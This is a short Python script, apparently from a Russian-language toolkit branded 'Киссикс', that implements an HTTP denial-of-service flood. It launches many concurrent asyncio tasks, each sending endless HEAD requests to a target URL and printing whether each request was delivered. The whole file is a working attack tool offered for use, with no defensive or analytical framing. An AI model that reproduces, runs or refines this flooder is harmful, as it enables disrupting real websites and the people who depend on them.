import aiohttp,asyncio
from rich.console import Console
from module.injector import injector_color
from datetime import datetime
color = injector_color()
pwaexho = Console()

async def dos_attack(session, url, sem):
    async with sem:
        while True:
            now = datetime.now()
            try:
                async with session.head(url, timeout=1) as response:
                    if response.status == 200:
                        pwaexho.print(f"{color}> [Киссикс] Запрос доставлен. | Статус: {response.status} | Время: {now.strftime('%H:%M:%S')} | URL: {url}")
                    else:
                        pwaexho.print(f"[#6A5ACD]> [Киссикс] Запрос не доставлен. | Статус: {response.status} | Время: {now.strftime('%H:%M:%S')} | URL: {url}")
            except: pass

async def dos_settings(url,threads):
    try:
        sem = asyncio.Semaphore(threads)
        tasks = []

        async with aiohttp.ClientSession() as session:
            tasks = [dos_attack(session, url, sem) for _ in range(threads)]
            await asyncio.gather(*tasks)
    except: pass


